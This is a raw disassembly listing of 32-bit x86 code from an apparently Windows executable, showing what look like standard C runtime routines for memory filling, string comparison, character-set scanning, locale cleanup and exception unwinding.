  427973:	push   ebx
  427974:	push   ebx
  427975:	push   DWORD PTR [ebp+0x14]
  427978:	push   eax
  427979:	push   DWORD PTR [ebp+0xc]
  42797c:	push   DWORD PTR [ebp+0x8]
  42797f:	call   DWORD PTR ds:0x4290ec
  427985:	mov    esi,eax
  427987:	mov    DWORD PTR [ebp-0x40],esi
  42798a:	cmp    esi,ebx
  42798c:	je     0x427a34
  427992:	mov    DWORD PTR [ebp-0x4],ebx
  427995:	add    eax,0x3
  427998:	and    eax,0xfffffffc
  42799b:	call   0x4253a0
  4279a0:	mov    DWORD PTR [ebp-0x18],esp
  4279a3:	mov    edi,esp
  4279a5:	mov    DWORD PTR [ebp-0x44],edi
  4279a8:	push   esi
  4279a9:	push   ebx
  4279aa:	push   edi
  4279ab:	call   0x427c50
  4279b0:	add    esp,0xc
  4279b3:	jmp    0x4279c5
  4279b5:	xor    eax,eax
  4279b7:	inc    eax
  4279b8:	ret    
  4279b9:	mov    esp,DWORD PTR [ebp-0x18]
  4279bc:	call   0x4287e5
  4279c1:	xor    ebx,ebx
  4279c3:	xor    edi,edi
  4279c5:	or     DWORD PTR [ebp-0x4],0xffffffff
  4279c9:	cmp    edi,ebx
  4279cb:	jne    0x4279f0
  4279cd:	push   DWORD PTR [ebp-0x40]
  4279d0:	call   0x426072
  4279d5:	pop    ecx
  4279d6:	mov    edi,eax
  4279d8:	cmp    edi,ebx
  4279da:	je     0x427a0d
  4279dc:	push   DWORD PTR [ebp-0x40]
  4279df:	push   ebx
  4279e0:	push   edi
  4279e1:	call   0x427c50
  4279e6:	add    esp,0xc
  4279e9:	mov    DWORD PTR [ebp-0x38],0x1
  4279f0:	push   DWORD PTR [ebp-0x40]
  4279f3:	push   edi
  4279f4:	push   DWORD PTR [ebp+0x14]
  4279f7:	push   DWORD PTR [ebp-0x34]
  4279fa:	push   DWORD PTR [ebp+0xc]
  4279fd:	push   DWORD PTR [ebp+0x8]
  427a00:	call   DWORD PTR ds:0x4290ec
  427a06:	mov    DWORD PTR [ebp-0x40],eax
  427a09:	cmp    eax,ebx
  427a0b:	jne    0x427a11
  427a0d:	xor    esi,esi
  427a0f:	jmp    0x427a37
  427a11:	push   DWORD PTR [ebp+0x1c]
  427a14:	push   DWORD PTR [ebp+0x18]
  427a17:	lea    eax,[ebp-0x40]
  427a1a:	push   eax
  427a1b:	push   edi
  427a1c:	push   DWORD PTR [ebp+0x20]
  427a1f:	push   DWORD PTR [ebp-0x3c]
  427a22:	call   0x428616
  427a27:	add    esp,0x18
  427a2a:	mov    esi,eax
  427a2c:	neg    esi
  427a2e:	sbb    esi,esi
  427a30:	neg    esi
  427a32:	jmp    0x427a37
  427a34:	mov    esi,DWORD PTR [ebp-0x48]
  427a37:	cmp    DWORD PTR [ebp-0x38],ebx
  427a3a:	je     0x427a5f
  427a3c:	push   edi
  427a3d:	call   0x425f5a
  427a42:	pop    ecx
  427a43:	jmp    0x427a5f
  427a45:	push   DWORD PTR [ebp+0x1c]
  427a48:	push   DWORD PTR [ebp+0x18]
  427a4b:	push   DWORD PTR [ebp+0x14]
  427a4e:	push   DWORD PTR [ebp+0x10]
  427a51:	push   DWORD PTR [ebp+0xc]
  427a54:	push   DWORD PTR [ebp+0x8]
  427a57:	call   DWORD PTR ds:0x4290ec
  427a5d:	mov    esi,eax
  427a5f:	cmp    DWORD PTR [ebp-0x34],ebx
  427a62:	je     0x427a6d
  427a64:	push   DWORD PTR [ebp-0x34]
  427a67:	call   0x425f5a
  427a6c:	pop    ecx
  427a6d:	mov    eax,esi
  427a6f:	lea    esp,[ebp-0x54]
  427a72:	call   0x42538b
  427a77:	ret    
  427a78:	push   0x1c
  427a7a:	push   0x429e88
  427a7f:	call   0x425350
  427a84:	xor    esi,esi
  427a86:	cmp    DWORD PTR ds:0x45ddc0,esi
  427a8c:	jne    0x427ac3
  427a8e:	lea    eax,[ebp-0x1c]
  427a91:	push   eax
  427a92:	xor    edi,edi
  427a94:	inc    edi
  427a95:	push   edi
  427a96:	push   0x429e5c
  427a9b:	push   edi
  427a9c:	call   DWORD PTR ds:0x4290fc
  427aa2:	test   eax,eax
  427aa4:	je     0x427aae
  427aa6:	mov    DWORD PTR ds:0x45ddc0,edi
  427aac:	jmp    0x427ac3
  427aae:	call   DWORD PTR ds:0x429028
  427ab4:	cmp    eax,0x78
  427ab7:	jne    0x427ac3
  427ab9:	mov    DWORD PTR ds:0x45ddc0,0x2
  427ac3:	mov    eax,ds:0x45ddc0
  427ac8:	cmp    eax,0x2
  427acb:	je     0x427bbb
  427ad1:	cmp    eax,esi
  427ad3:	je     0x427bbb
  427ad9:	cmp    eax,0x1
  427adc:	jne    0x427be1
  427ae2:	mov    DWORD PTR [ebp-0x20],esi
  427ae5:	mov    DWORD PTR [ebp-0x24],esi
  427ae8:	cmp    DWORD PTR [ebp+0x18],esi
  427aeb:	jne    0x427af5
  427aed:	mov    eax,ds:0x45ddb4
  427af2:	mov    DWORD PTR [ebp+0x18],eax
  427af5:	push   esi
  427af6:	push   esi
  427af7:	push   DWORD PTR [ebp+0x10]
  427afa:	push   DWORD PTR [ebp+0xc]
  427afd:	xor    eax,eax
  427aff:	cmp    DWORD PTR [ebp+0x20],esi
  427b02:	setne  al
  427b05:	lea    eax,[eax*8+0x1]
  427b0c:	push   eax
  427b0d:	push   DWORD PTR [ebp+0x18]
  427b10:	call   DWORD PTR ds:0x4290f0
  427b16:	mov    edi,eax
  427b18:	mov    DWORD PTR [ebp-0x28],edi
  427b1b:	test   edi,edi
  427b1d:	je     0x427be1
  427b23:	and    DWORD PTR [ebp-0x4],0x0
  427b27:	lea    ebx,[edi+edi*1]
  427b2a:	mov    eax,ebx
  427b2c:	add    eax,0x3
  427b2f:	and    eax,0xfffffffc
  427b32:	call   0x4253a0
  427b37:	mov    DWORD PTR [ebp-0x18],esp
  427b3a:	mov    esi,esp
  427b3c:	mov    DWORD PTR [ebp-0x2c],esi
  427b3f:	push   ebx
  427b40:	push   0x0
  427b42:	push   esi
  427b43:	call   0x427c50
  427b48:	add    esp,0xc
  427b4b:	or     DWORD PTR [ebp-0x4],0xffffffff
  427b4f:	jmp    0x427b66
  427b51:	xor    eax,eax
  427b53:	inc    eax
  427b54:	ret    
  427b55:	mov    esp,DWORD PTR [ebp-0x18]
  427b58:	call   0x4287e5
  427b5d:	xor    esi,esi
  427b5f:	or     DWORD PTR [ebp-0x4],0xffffffff
  427b63:	mov    edi,DWORD PTR [ebp-0x28]
  427b66:	test   esi,esi
  427b68:	jne    0x427b81
  427b6a:	push   edi
  427b6b:	push   0x2
  427b6d:	call   0x426468
  427b72:	pop    ecx
  427b73:	pop    ecx
  427b74:	mov    esi,eax
  427b76:	test   esi,esi
  427b78:	je     0x427be1
  427b7a:	mov    DWORD PTR [ebp-0x24],0x1
  427b81:	push   edi
  427b82:	push   esi
  427b83:	push   DWORD PTR [ebp+0x10]
  427b86:	push   DWORD PTR [ebp+0xc]
  427b89:	push   0x1
  427b8b:	push   DWORD PTR [ebp+0x18]
  427b8e:	call   DWORD PTR ds:0x4290f0
  427b94:	test   eax,eax
  427b96:	je     0x427ba9
  427b98:	push   DWORD PTR [ebp+0x14]
  427b9b:	push   eax
  427b9c:	push   esi
  427b9d:	push   DWORD PTR [ebp+0x8]
  427ba0:	call   DWORD PTR ds:0x4290fc
  427ba6:	mov    DWORD PTR [ebp-0x20],eax
  427ba9:	cmp    DWORD PTR [ebp-0x24],0x0
  427bad:	je     0x427bb6
  427baf:	push   esi
  427bb0:	call   0x425f5a
  427bb5:	pop    ecx
  427bb6:	mov    eax,DWORD PTR [ebp-0x20]
  427bb9:	jmp    0x427c29
  427bbb:	mov    ebx,DWORD PTR [ebp+0x1c]
  427bbe:	cmp    ebx,esi
  427bc0:	jne    0x427bc8
  427bc2:	mov    ebx,DWORD PTR ds:0x45dda4
  427bc8:	mov    edi,DWORD PTR [ebp+0x18]
  427bcb:	test   edi,edi
  427bcd:	jne    0x427bd5
  427bcf:	mov    edi,DWORD PTR ds:0x45ddb4
  427bd5:	push   ebx
  427bd6:	call   0x4285cd
  427bdb:	pop    ecx
  427bdc:	cmp    eax,0xffffffff
  427bdf:	jne    0x427be5
  427be1:	xor    eax,eax
  427be3:	jmp    0x427c29
  427be5:	cmp    eax,edi
  427be7:	je     0x427c07
  427be9:	push   0x0
  427beb:	push   0x0
  427bed:	lea    ecx,[ebp+0x10]
  427bf0:	push   ecx
  427bf1:	push   DWORD PTR [ebp+0xc]
  427bf4:	push   eax
  427bf5:	push   edi
  427bf6:	call   0x428616
  427bfb:	add    esp,0x18
  427bfe:	mov    esi,eax
  427c00:	test   esi,esi
  427c02:	je     0x427be1
  427c04:	mov    DWORD PTR [ebp+0xc],esi
  427c07:	push   DWORD PTR [ebp+0x14]
  427c0a:	push   DWORD PTR [ebp+0x10]
  427c0d:	push   DWORD PTR [ebp+0xc]
  427c10:	push   DWORD PTR [ebp+0x8]
  427c13:	push   ebx
  427c14:	call   DWORD PTR ds:0x4290f8
  427c1a:	mov    edi,eax
  427c1c:	test   esi,esi
  427c1e:	je     0x427c27
  427c20:	push   esi
  427c21:	call   0x425f5a
  427c26:	pop    ecx
  427c27:	mov    eax,edi
  427c29:	lea    esp,[ebp-0x38]
  427c2c:	call   0x42538b
  427c31:	ret    
  427c32:	mov    eax,ds:0x45ddc4
  427c37:	test   eax,eax
  427c39:	je     0x427c4a
  427c3b:	push   DWORD PTR [esp+0x4]
  427c3f:	call   eax
  427c41:	test   eax,eax
  427c43:	pop    ecx
  427c44:	je     0x427c4a
  427c46:	xor    eax,eax
  427c48:	inc    eax
  427c49:	ret    
  427c4a:	xor    eax,eax
  427c4c:	ret    
  427c4d:	int3   
  427c4e:	int3   
  427c4f:	int3   
  427c50:	mov    edx,DWORD PTR [esp+0xc]
  427c54:	mov    ecx,DWORD PTR [esp+0x4]
  427c58:	test   edx,edx
  427c5a:	je     0x427cab
  427c5c:	xor    eax,eax
  427c5e:	mov    al,BYTE PTR [esp+0x8]
  427c62:	push   edi
  427c63:	mov    edi,ecx
  427c65:	cmp    edx,0x4
  427c68:	jb     0x427c9b
  427c6a:	neg    ecx
  427c6c:	and    ecx,0x3
  427c6f:	je     0x427c7d
  427c71:	sub    edx,ecx
  427c73:	mov    BYTE PTR [edi],al
  427c75:	add    edi,0x1
  427c78:	sub    ecx,0x1
  427c7b:	jne    0x427c73
  427c7d:	mov    ecx,eax
  427c7f:	shl    eax,0x8
  427c82:	add    eax,ecx
  427c84:	mov    ecx,eax
  427c86:	shl    eax,0x10
  427c89:	add    eax,ecx
  427c8b:	mov    ecx,edx
  427c8d:	and    edx,0x3
  427c90:	shr    ecx,0x2
  427c93:	je     0x427c9b
  427c95:	rep stos DWORD PTR es:[edi],eax
  427c97:	test   edx,edx
  427c99:	je     0x427ca5
  427c9b:	mov    BYTE PTR [edi],al
  427c9d:	add    edi,0x1
  427ca0:	sub    edx,0x1
  427ca3:	jne    0x427c9b
  427ca5:	mov    eax,DWORD PTR [esp+0x8]
  427ca9:	pop    edi
  427caa:	ret    
  427cab:	mov    eax,DWORD PTR [esp+0x4]
  427caf:	ret    
  427cb0:	push   esi
  427cb1:	mov    esi,DWORD PTR [esp+0x8]
  427cb5:	test   esi,esi
  427cb7:	je     0x427e3e
  427cbd:	push   DWORD PTR [esi+0x4]
  427cc0:	call   0x425f5a
  427cc5:	push   DWORD PTR [esi+0x8]
  427cc8:	call   0x425f5a
  427ccd:	push   DWORD PTR [esi+0xc]
  427cd0:	call   0x425f5a
  427cd5:	push   DWORD PTR [esi+0x10]
  427cd8:	call   0x425f5a
  427cdd:	push   DWORD PTR [esi+0x14]
  427ce0:	call   0x425f5a
  427ce5:	push   DWORD PTR [esi+0x18]
  427ce8:	call   0x425f5a
  427ced:	push   DWORD PTR [esi]
  427cef:	call   0x425f5a
  427cf4:	push   DWORD PTR [esi+0x20]
  427cf7:	call   0x425f5a
  427cfc:	push   DWORD PTR [esi+0x24]
  427cff:	call   0x425f5a
  427d04:	push   DWORD PTR [esi+0x28]
  427d07:	call   0x425f5a
  427d0c:	push   DWORD PTR [esi+0x2c]
  427d0f:	call   0x425f5a
  427d14:	push   DWORD PTR [esi+0x30]
  427d17:	call   0x425f5a
  427d1c:	push   DWORD PTR [esi+0x34]
  427d1f:	call   0x425f5a
  427d24:	push   DWORD PTR [esi+0x1c]
  427d27:	call   0x425f5a
  427d2c:	push   DWORD PTR [esi+0x38]
  427d2f:	call   0x425f5a
  427d34:	push   DWORD PTR [esi+0x3c]
  427d37:	call   0x425f5a
  427d3c:	add    esp,0x40
  427d3f:	push   DWORD PTR [esi+0x40]
  427d42:	call   0x425f5a
  427d47:	push   DWORD PTR [esi+0x44]
  427d4a:	call   0x425f5a
  427d4f:	push   DWORD PTR [esi+0x48]
  427d52:	call   0x425f5a
  427d57:	push   DWORD PTR [esi+0x4c]
  427d5a:	call   0x425f5a
  427d5f:	push   DWORD PTR [esi+0x50]
  427d62:	call   0x425f5a
  427d67:	push   DWORD PTR [esi+0x54]
  427d6a:	call   0x425f5a
  427d6f:	push   DWORD PTR [esi+0x58]
  427d72:	call   0x425f5a
  427d77:	push   DWORD PTR [esi+0x5c]
  427d7a:	call   0x425f5a
  427d7f:	push   DWORD PTR [esi+0x60]
  427d82:	call   0x425f5a
  427d87:	push   DWORD PTR [esi+0x64]
  427d8a:	call   0x425f5a
  427d8f:	push   DWORD PTR [esi+0x68]
  427d92:	call   0x425f5a
  427d97:	push   DWORD PTR [esi+0x6c]
  427d9a:	call   0x425f5a
  427d9f:	push   DWORD PTR [esi+0x70]
  427da2:	call   0x425f5a
  427da7:	push   DWORD PTR [esi+0x74]
  427daa:	call   0x425f5a
  427daf:	push   DWORD PTR [esi+0x78]
  427db2:	call   0x425f5a
  427db7:	push   DWORD PTR [esi+0x7c]
  427dba:	call   0x425f5a
  427dbf:	add    esp,0x40
  427dc2:	push   DWORD PTR [esi+0x80]
  427dc8:	call   0x425f5a
  427dcd:	push   DWORD PTR [esi+0x84]
  427dd3:	call   0x425f5a
  427dd8:	push   DWORD PTR [esi+0x88]
  427dde:	call   0x425f5a
  427de3:	push   DWORD PTR [esi+0x8c]
  427de9:	call   0x425f5a
  427dee:	push   DWORD PTR [esi+0x90]
  427df4:	call   0x425f5a
  427df9:	push   DWORD PTR [esi+0x94]
  427dff:	call   0x425f5a
  427e04:	push   DWORD PTR [esi+0x98]
  427e0a:	call   0x425f5a
  427e0f:	push   DWORD PTR [esi+0x9c]
  427e15:	call   0x425f5a
  427e1a:	push   DWORD PTR [esi+0xa0]
  427e20:	call   0x425f5a
  427e25:	push   DWORD PTR [esi+0xa4]
  427e2b:	call   0x425f5a
  427e30:	push   DWORD PTR [esi+0xa8]
  427e36:	call   0x425f5a
  427e3b:	add    esp,0x2c
  427e3e:	pop    esi
  427e3f:	ret    
  427e40:	push   esi
  427e41:	mov    esi,DWORD PTR [esp+0x8]
  427e45:	test   esi,esi
  427e47:	je     0x427e9d
  427e49:	mov    eax,DWORD PTR [esi]
  427e4b:	mov    ecx,DWORD PTR ds:0x45d934
  427e51:	cmp    eax,DWORD PTR [ecx]
  427e53:	je     0x427e64
  427e55:	cmp    eax,DWORD PTR ds:0x45d904
  427e5b:	je     0x427e64
  427e5d:	push   eax
  427e5e:	call   0x425f5a
  427e63:	pop    ecx
  427e64:	mov    eax,DWORD PTR [esi+0x4]
  427e67:	mov    ecx,DWORD PTR ds:0x45d934
  427e6d:	cmp    eax,DWORD PTR [ecx+0x4]
  427e70:	je     0x427e81
  427e72:	cmp    eax,DWORD PTR ds:0x45d908
  427e78:	je     0x427e81
  427e7a:	push   eax
  427e7b:	call   0x425f5a
  427e80:	pop    ecx
  427e81:	mov    esi,DWORD PTR [esi+0x8]
  427e84:	mov    eax,ds:0x45d934
  427e89:	cmp    esi,DWORD PTR [eax+0x8]
  427e8c:	je     0x427e9d
  427e8e:	cmp    esi,DWORD PTR ds:0x45d90c
  427e94:	je     0x427e9d
  427e96:	push   esi
  427e97:	call   0x425f5a
  427e9c:	pop    ecx
  427e9d:	pop    esi
  427e9e:	ret    
  427e9f:	push   esi
  427ea0:	mov    esi,DWORD PTR [esp+0x8]
  427ea4:	test   esi,esi
  427ea6:	je     0x427f76
  427eac:	mov    eax,DWORD PTR [esi+0xc]
  427eaf:	mov    ecx,DWORD PTR ds:0x45d934
  427eb5:	cmp    eax,DWORD PTR [ecx+0xc]
  427eb8:	je     0x427ec9
  427eba:	cmp    eax,DWORD PTR ds:0x45d910
  427ec0:	je     0x427ec9
  427ec2:	push   eax
  427ec3:	call   0x425f5a
  427ec8:	pop    ecx
  427ec9:	mov    eax,DWORD PTR [esi+0x10]
  427ecc:	mov    ecx,DWORD PTR ds:0x45d934
  427ed2:	cmp    eax,DWORD PTR [ecx+0x10]
  427ed5:	je     0x427ee6
  427ed7:	cmp    eax,DWORD PTR ds:0x45d914
  427edd:	je     0x427ee6
  427edf:	push   eax
  427ee0:	call   0x425f5a
  427ee5:	pop    ecx
  427ee6:	mov    eax,DWORD PTR [esi+0x14]
  427ee9:	mov    ecx,DWORD PTR ds:0x45d934
  427eef:	cmp    eax,DWORD PTR [ecx+0x14]
  427ef2:	je     0x427f03
  427ef4:	cmp    eax,DWORD PTR ds:0x45d918
  427efa:	je     0x427f03
  427efc:	push   eax
  427efd:	call   0x425f5a
  427f02:	pop    ecx
  427f03:	mov    eax,DWORD PTR [esi+0x18]
  427f06:	mov    ecx,DWORD PTR ds:0x45d934
  427f0c:	cmp    eax,DWORD PTR [ecx+0x18]
  427f0f:	je     0x427f20
  427f11:	cmp    eax,DWORD PTR ds:0x45d91c
  427f17:	je     0x427f20
  427f19:	push   eax
  427f1a:	call   0x425f5a
  427f1f:	pop    ecx
  427f20:	mov    eax,DWORD PTR [esi+0x1c]
  427f23:	mov    ecx,DWORD PTR ds:0x45d934
  427f29:	cmp    eax,DWORD PTR [ecx+0x1c]
  427f2c:	je     0x427f3d
  427f2e:	cmp    eax,DWORD PTR ds:0x45d920
  427f34:	je     0x427f3d
  427f36:	push   eax
  427f37:	call   0x425f5a
  427f3c:	pop    ecx
  427f3d:	mov    eax,DWORD PTR [esi+0x20]
  427f40:	mov    ecx,DWORD PTR ds:0x45d934
  427f46:	cmp    eax,DWORD PTR [ecx+0x20]
  427f49:	je     0x427f5a
  427f4b:	cmp    eax,DWORD PTR ds:0x45d924
  427f51:	je     0x427f5a
  427f53:	push   eax
  427f54:	call   0x425f5a
  427f59:	pop    ecx
  427f5a:	mov    esi,DWORD PTR [esi+0x24]
  427f5d:	mov    eax,ds:0x45d934
  427f62:	cmp    esi,DWORD PTR [eax+0x24]
  427f65:	je     0x427f76
  427f67:	cmp    esi,DWORD PTR ds:0x45d928
  427f6d:	je     0x427f76
  427f6f:	push   esi
  427f70:	call   0x425f5a
  427f75:	pop    ecx
  427f76:	pop    esi
  427f77:	ret    
  427f78:	int3   
  427f79:	int3   
  427f7a:	int3   
  427f7b:	int3   
  427f7c:	int3   
  427f7d:	int3   
  427f7e:	int3   
  427f7f:	int3   
  427f80:	push   ebp
  427f81:	mov    ebp,esp
  427f83:	push   esi
  427f84:	xor    eax,eax
  427f86:	push   eax
  427f87:	push   eax
  427f88:	push   eax
  427f89:	push   eax
  427f8a:	push   eax
  427f8b:	push   eax
  427f8c:	push   eax
  427f8d:	push   eax
  427f8e:	mov    edx,DWORD PTR [ebp+0xc]
  427f91:	lea    ecx,[ecx+0x0]
  427f94:	mov    al,BYTE PTR [edx]
  427f96:	or     al,al
  427f98:	je     0x427fa3
  427f9a:	add    edx,0x1
  427f9d:	bts    DWORD PTR [esp],eax
  427fa1:	jmp    0x427f94
  427fa3:	mov    esi,DWORD PTR [ebp+0x8]
  427fa6:	or     ecx,0xffffffff
  427fa9:	lea    ecx,[ecx+0x0]
  427fac:	add    ecx,0x1
  427faf:	mov    al,BYTE PTR [esi]
  427fb1:	or     al,al
  427fb3:	je     0x427fbe
  427fb5:	add    esi,0x1
  427fb8:	bt     DWORD PTR [esp],eax
  427fbc:	jae    0x427fac
  427fbe:	mov    eax,ecx
  427fc0:	add    esp,0x20
  427fc3:	pop    esi
  427fc4:	leave  
  427fc5:	ret    
  427fc6:	int3   
  427fc7:	int3   
  427fc8:	int3   
  427fc9:	int3   
  427fca:	int3   
  427fcb:	int3   
  427fcc:	int3   
  427fcd:	int3   
  427fce:	int3   
  427fcf:	int3   
  427fd0:	mov    edx,DWORD PTR [esp+0x4]
  427fd4:	mov    ecx,DWORD PTR [esp+0x8]
  427fd8:	test   edx,0x3
  427fde:	jne    0x42801c
  427fe0:	mov    eax,DWORD PTR [edx]
  427fe2:	cmp    al,BYTE PTR [ecx]
  427fe4:	jne    0x428014
  427fe6:	or     al,al
  427fe8:	je     0x428010
  427fea:	cmp    ah,BYTE PTR [ecx+0x1]
  427fed:	jne    0x428014
  427fef:	or     ah,ah
  427ff1:	je     0x428010
  427ff3:	shr    eax,0x10
  427ff6:	cmp    al,BYTE PTR [ecx+0x2]
  427ff9:	jne    0x428014
  427ffb:	or     al,al
  427ffd:	je     0x428010
  427fff:	cmp    ah,BYTE PTR [ecx+0x3]
  428002:	jne    0x428014
  428004:	add    ecx,0x4
  428007:	add    edx,0x4
  42800a:	or     ah,ah
  42800c:	jne    0x427fe0
  42800e:	mov    edi,edi
  428010:	xor    eax,eax
  428012:	ret    
  428013:	nop
  428014:	sbb    eax,eax
  428016:	shl    eax,1
  428018:	add    eax,0x1
  42801b:	ret    
  42801c:	test   edx,0x1
  428022:	je     0x42803c
  428024:	mov    al,BYTE PTR [edx]
  428026:	add    edx,0x1
  428029:	cmp    al,BYTE PTR [ecx]
  42802b:	jne    0x428014
  42802d:	add    ecx,0x1
  428030:	or     al,al
  428032:	je     0x428010
  428034:	test   edx,0x2
  42803a:	je     0x427fe0
  42803c:	mov    ax,WORD PTR [edx]
  42803f:	add    edx,0x2
  428042:	cmp    al,BYTE PTR [ecx]
  428044:	jne    0x428014
  428046:	or     al,al
  428048:	je     0x428010
  42804a:	cmp    ah,BYTE PTR [ecx+0x1]
  42804d:	jne    0x428014
  42804f:	or     ah,ah
  428051:	je     0x428010
  428053:	add    ecx,0x2
  428056:	jmp    0x427fe0
  428058:	int3   
  428059:	int3   
  42805a:	int3   
  42805b:	int3   
  42805c:	int3   
  42805d:	int3   
  42805e:	int3   
  42805f:	int3   
  428060:	mov    eax,DWORD PTR [esp+0xc]
  428064:	test   eax,eax
  428066:	je     0x4280b2
  428068:	mov    edx,DWORD PTR [esp+0x4]
  42806c:	push   esi
  42806d:	push   edi
  42806e:	mov    esi,edx
  428070:	mov    edi,DWORD PTR [esp+0x10]
  428074:	or     edx,edi
  428076:	and    edx,0x3
  428079:	je     0x4280b3
  42807b:	test   eax,0x1
  428080:	je     0x428093
  428082:	mov    cl,BYTE PTR [esi]
  428084:	cmp    cl,BYTE PTR [edi]
  428086:	jne    0x4280e0
  428088:	add    esi,0x1
  42808b:	add    edi,0x1
  42808e:	sub    eax,0x1
  428091:	je     0x4280b0
  428093:	mov    cl,BYTE PTR [esi]
  428095:	mov    dl,BYTE PTR [edi]
  428097:	cmp    cl,dl
  428099:	jne    0x4280e0
  42809b:	mov    cl,BYTE PTR [esi+0x1]
  42809e:	mov    dl,BYTE PTR [edi+0x1]
  4280a1:	cmp    cl,dl
  4280a3:	jne    0x4280e0
  4280a5:	add    edi,0x2
  4280a8:	add    esi,0x2
  4280ab:	sub    eax,0x2
  4280ae:	jne    0x428093
  4280b0:	pop    edi
  4280b1:	pop    esi
  4280b2:	ret    
  4280b3:	mov    ecx,eax
  4280b5:	and    eax,0x3
  4280b8:	shr    ecx,0x2
  4280bb:	je     0x4280e8
  4280bd:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4280bf:	je     0x4280e8
  4280c1:	mov    ecx,DWORD PTR [esi-0x4]
  4280c4:	mov    edx,DWORD PTR [edi-0x4]
  4280c7:	cmp    cl,dl
  4280c9:	jne    0x4280db
  4280cb:	cmp    ch,dh
  4280cd:	jne    0x4280db
  4280cf:	shr    ecx,0x10
  4280d2:	shr    edx,0x10
  4280d5:	cmp    cl,dl
  4280d7:	jne    0x4280db
  4280d9:	cmp    ch,dh
  4280db:	mov    eax,0x0
  4280e0:	sbb    eax,eax
  4280e2:	pop    edi
  4280e3:	sbb    eax,0xffffffff
  4280e6:	pop    esi
  4280e7:	ret    
  4280e8:	test   eax,eax
  4280ea:	je     0x4280b0
  4280ec:	mov    edx,DWORD PTR [esi]
  4280ee:	mov    ecx,DWORD PTR [edi]
  4280f0:	cmp    dl,cl
  4280f2:	jne    0x4280db
  4280f4:	sub    eax,0x1
  4280f7:	je     0x428115
  4280f9:	cmp    dh,ch
  4280fb:	jne    0x4280db
  4280fd:	sub    eax,0x1
  428100:	je     0x428115
  428102:	and    ecx,0xff0000
  428108:	and    edx,0xff0000
  42810e:	cmp    edx,ecx
  428110:	jne    0x4280db
  428112:	sub    eax,0x1
  428115:	pop    edi
  428116:	pop    esi
  428117:	ret    
  428118:	int3   
  428119:	int3   
  42811a:	int3   
  42811b:	int3   
  42811c:	int3   
  42811d:	int3   
  42811e:	int3   
  42811f:	int3   
  428120:	push   ebp
  428121:	mov    ebp,esp
  428123:	push   edi
  428124:	push   esi
  428125:	push   ebx
  428126:	mov    ecx,DWORD PTR [ebp+0x10]
  428129:	jecxz  0x428152
  42812b:	mov    ebx,ecx
  42812d:	mov    edi,DWORD PTR [ebp+0x8]
  428130:	mov    esi,edi
  428132:	xor    eax,eax
  428134:	repnz scas al,BYTE PTR es:[edi]
  428136:	neg    ecx
  428138:	add    ecx,ebx
  42813a:	mov    edi,esi
  42813c:	mov    esi,DWORD PTR [ebp+0xc]
  42813f:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428141:	mov    al,BYTE PTR [esi-0x1]
  428144:	xor    ecx,ecx
  428146:	cmp    al,BYTE PTR [edi-0x1]
  428149:	ja     0x428150
  42814b:	je     0x428152
  42814d:	sub    ecx,0x2
  428150:	not    ecx
  428152:	mov    eax,ecx
  428154:	pop    ebx
  428155:	pop    esi
  428156:	pop    edi
  428157:	leave  
  428158:	ret    
  428159:	int3   
  42815a:	int3   
  42815b:	int3   
  42815c:	int3   
  42815d:	int3   
  42815e:	int3   
  42815f:	int3   
  428160:	push   ebp
  428161:	mov    ebp,esp
  428163:	push   esi
  428164:	xor    eax,eax
  428166:	push   eax
  428167:	push   eax
  428168:	push   eax
  428169:	push   eax
  42816a:	push   eax
  42816b:	push   eax
  42816c:	push   eax
  42816d:	push   eax
  42816e:	mov    edx,DWORD PTR [ebp+0xc]
  428171:	lea    ecx,[ecx+0x0]
  428174:	mov    al,BYTE PTR [edx]
  428176:	or     al,al
  428178:	je     0x428183
  42817a:	add    edx,0x1
  42817d:	bts    DWORD PTR [esp],eax
  428181:	jmp    0x428174
  428183:	mov    esi,DWORD PTR [ebp+0x8]
  428186:	mov    edi,edi
  428188:	mov    al,BYTE PTR [esi]
  42818a:	or     al,al
  42818c:	je     0x42819a
  42818e:	add    esi,0x1
  428191:	bt     DWORD PTR [esp],eax
  428195:	jae    0x428188
  428197:	lea    eax,[esi-0x1]
  42819a:	add    esp,0x20
  42819d:	pop    esi
  42819e:	leave  
  42819f:	ret    
  4281a0:	push   ebp
  4281a1:	mov    ebp,esp
  4281a3:	push   ebx
  4281a4:	push   esi
  4281a5:	push   edi
  4281a6:	push   ebp
  4281a7:	push   0x0
  4281a9:	push   0x0
  4281ab:	push   0x4281b8
  4281b0:	push   DWORD PTR [ebp+0x8]
  4281b3:	call   0x428c2e
  4281b8:	pop    ebp
  4281b9:	pop    edi
  4281ba:	pop    esi
  4281bb:	pop    ebx
  4281bc:	mov    esp,ebp
  4281be:	pop    ebp
  4281bf:	ret    
  4281c0:	mov    ecx,DWORD PTR [esp+0x4]
  4281c4:	test   DWORD PTR [ecx+0x4],0x6
  4281cb:	mov    eax,0x1
  4281d0:	je     0x4281e1
  4281d2:	mov    eax,DWORD PTR [esp+0x8]
  4281d6:	mov    edx,DWORD PTR [esp+0x10]
  4281da:	mov    DWORD PTR [edx],eax
  4281dc:	mov    eax,0x3
  4281e1:	ret    
  4281e2:	push   ebx
  4281e3:	push   esi
  4281e4:	push   edi
  4281e5:	mov    eax,DWORD PTR [esp+0x10]
  4281e9:	push   eax
  4281ea:	push   0xfffffffe
  4281ec:	push   0x4281c0
  4281f1:	push   DWORD PTR fs:0x0
  4281f8:	mov    DWORD PTR fs:0x0,esp
  4281ff:	mov    eax,DWORD PTR [esp+0x20]
  428203:	mov    ebx,DWORD PTR [eax+0x8]
  428206:	mov    esi,DWORD PTR [eax+0xc]
  428209:	cmp    esi,0xffffffff
  42820c:	je     0x42823c
  42820e:	cmp    esi,DWORD PTR [esp+0x24]
  428212:	je     0x42823c
  428214:	lea    esi,[esi+esi*2]
  428217:	mov    ecx,DWORD PTR [ebx+esi*4]
  42821a:	mov    DWORD PTR [esp+0x8],ecx
  42821e:	mov    DWORD PTR [eax+0xc],ecx
  428221:	cmp    DWORD PTR [ebx+esi*4+0x4],0x0
  428226:	jne    0x42823a
  428228:	push   0x101
  42822d:	mov    eax,DWORD PTR [ebx+esi*4+0x8]
  428231:	call   0x428276
  428236:	call   DWORD PTR [ebx+esi*4+0x8]
  42823a:	jmp    0x4281ff
  42823c:	pop    DWORD PTR fs:0x0
  428243:	add    esp,0xc
  428246:	pop    edi
  428247:	pop    esi
  428248:	pop    ebx
  428249:	ret    
  42824a:	xor    eax,eax
  42824c:	mov    ecx,DWORD PTR fs:0x0
  428253:	cmp    DWORD PTR [ecx+0x4],0x4281c0
  42825a:	jne    0x42826c
